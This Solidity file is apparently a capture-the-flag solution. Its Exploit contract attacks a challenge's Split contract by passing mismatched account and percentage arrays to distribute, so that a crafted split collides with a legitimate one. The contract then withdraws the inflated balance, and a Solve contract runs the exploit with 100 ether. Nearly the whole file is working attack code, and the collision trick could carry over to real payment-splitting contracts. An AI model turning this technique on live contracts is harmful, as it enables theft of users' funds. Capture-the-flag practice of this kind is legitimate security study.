// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFSolver.sol";
import "../src/Challenge.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;

    uint256 private targetTokenId;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external payable {
        {
            address[] memory addrs = new address[](2);
            addrs[0] = address(0x000000000000000000000000000000000000dEaD);
            addrs[1] = address(0x000000000000000000000000000000000000bEEF);
            uint32[] memory percents = new uint32[](2);
            percents[0] = 5e5;
            percents[1] = 5e5;

            CHALLENGE.SPLIT().distribute(0, addrs, percents, 0, IERC20(address(0x00)));
        }

        address[] memory legitimateAccounts = new address[](2);
        legitimateAccounts[0] = address(this);
        legitimateAccounts[1] = address(bytes20(uint160(0x1e8480)));

        uint32[] memory legitimateSplits = new uint32[](2);
        legitimateSplits[0] = 9.9e5;
        legitimateSplits[1] = 0.1e5;

        uint256 id = CHALLENGE.SPLIT().createSplit(legitimateAccounts, legitimateSplits, 0);

        Split.SplitData memory data = CHALLENGE.SPLIT().splitsById(id);
        data.wallet.deposit{value: msg.value}();

        address[] memory fakeAccounts = new address[](1);
        fakeAccounts[0] = address(this);
        uint32[] memory fakeSplits = new uint32[](3);
        fakeSplits[0] = 0x1e8480;
        fakeSplits[1] = 9.9e5;
        fakeSplits[2] = 0.1e5;
        CHALLENGE.SPLIT().distribute(id, fakeAccounts, fakeSplits, 0, IERC20(address(0x00)));

        IERC20[] memory withdraws = new IERC20[](1);
        uint256[] memory bals = new uint[](1);
        withdraws[0] = IERC20(address(0x00));
        bals[0] = CHALLENGE.SPLIT().balances(address(this), address(0x00));

        CHALLENGE.SPLIT().withdraw(withdraws, bals);
    }

    receive() external payable {}
}

contract Solve is CTFSolver {
    function solve(address challenge_, address) internal override {
        Challenge challenge = Challenge(challenge_);

        console.log("solved?", challenge.isSolved());

        Exploit exploit = new Exploit(challenge);
        exploit.exploit{value: 100 ether}();

        console.log("solved?", challenge.isSolved());
    }
}
